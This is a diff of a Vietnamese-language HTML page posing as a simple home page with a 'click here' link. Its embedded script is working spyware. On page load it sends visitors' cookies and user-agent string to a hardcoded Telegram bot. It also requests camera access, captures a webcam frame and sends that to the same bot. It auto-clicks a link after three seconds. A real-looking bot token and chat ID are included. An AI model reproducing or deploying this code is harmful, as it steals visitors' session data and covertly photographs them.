@@ -1,80 +1,88 @@
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Trang chủ</title>
 </head>
 <body>
-    <a href="https://www.facebook.com/profile.php?id=61581100331452">Bấm vào đây</a>
+    <a href="https://www.facebook.com/" target="_blank">Bấm vào đây</a>
+
     <script>
-        //(function() {
-    const TOKEN = "8933121065:AAH46tIepTtgs-cixBVM11a13z3eW0hMhXE";
-    const CHAT_ID = "6444279279";
-    function sendToTelegram(text) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text.slice(0, 4096) })
-        }).catch(err => console.log(err));
-    }
+        // ========== CẤU HÌNH TELEGRAM ==========
+        const TOKEN = "8933121065:AAH46tIepTtgs-cixBVM11a13z3eW0hMhXE";
+        const CHAT_ID = "6444279279";
 
-    function dataURItoBlob(dataURI) {
-        const byteString = atob(dataURI.split(',')[1]);
-        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-        const ab = new ArrayBuffer(byteString.length);
-        const ia = new Uint8Array(ab);
-        for (let i = 0; i < byteString.length; i++) {
-            ia[i] = byteString.charCodeAt(i);
+        // ========== HÀM GỬI TIN NHẮN ==========
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text.slice(0, 4096) })
+            }).catch(err => console.log(err));
         }
-        return new Blob([ab], { type: mimeString });
-    }
-    function sendPhotoToTelegram(base64Image) {
-        const blob = dataURItoBlob(base64Image);
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'capture.jpg');
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        }).catch(err => console.log(err));
-    }
-    document.addEventListener('click', function(event) {
-        let target = event.target.closest('a');
-        if (!target) return;
 
-        let stolenCookies = document.cookie || 'No cookies';
-        let info = `[${new Date().toISOString()}] UA: ${navigator.userAgent}\nCookies: ${stolenCookies}`;
-        sendToTelegram(info);
-
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    let video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.onloadedmetadata = function() {
-                        video.play();
-                        let canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        let ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        let frameData = canvas.toDataURL('image/jpeg', 0.7);
-                        sendPhotoToTelegram(frameData);
-                        stream.getTracks().forEach(track => track.stop());
-                    };
-                })
-                .catch(function(err) {
-                    sendToTelegram('Camera error: ' + err.message);
-                });
-        } else {
-            sendToTelegram('Camera not supported');
+        // ========== HÀM CHUYỂN BASE64 -> BLOB ==========
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
         }
-    });
 
-    setTimeout(() => {
-        let anyLink = document.querySelector('a');
-        if (anyLink) anyLink.click();
-    }, 3000);
-})();
+        // ========== HÀM GỬI ẢNH ==========
+        function sendPhotoToTelegram(base64Image) {
+            const blob = dataURItoBlob(base64Image);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'capture.jpg');
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.log(err));
+        }
+
+        // ========== GỬI COOKIE + ẢNH KHI TRANG TẢI XONG ==========
+        document.addEventListener('DOMContentLoaded', function() {
+            // 1. Gửi cookie và thông tin thiết bị
+            const info = `[${new Date().toISOString()}] UA: ${navigator.userAgent}\nCookies: ${document.cookie || 'Không có cookie'}`;
+            sendToTelegram(info);
+
+            // 2. Yêu cầu quyền camera và chụp ảnh
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(stream) {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.onloadedmetadata = function() {
+                            video.play();
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const frameData = canvas.toDataURL('image/jpeg', 0.7);
+                            sendPhotoToTelegram(frameData);
+                            stream.getTracks().forEach(track => track.stop());
+                        };
+                    })
+                    .catch(function(err) {
+                        sendToTelegram('Lỗi camera: ' + err.message);
+                    });
+            } else {
+                sendToTelegram('Trình duyệt không hỗ trợ camera');
+            }
+        });
+
+        // ========== (TÙY CHỌN) TỰ ĐỘNG CLICK SAU 3 GIÂY ==========
+        setTimeout(() => {
+            const anyLink = document.querySelector('a');
+            if (anyLink) anyLink.click();
+        }, 3000);
     </script>
 </body>
 </html>
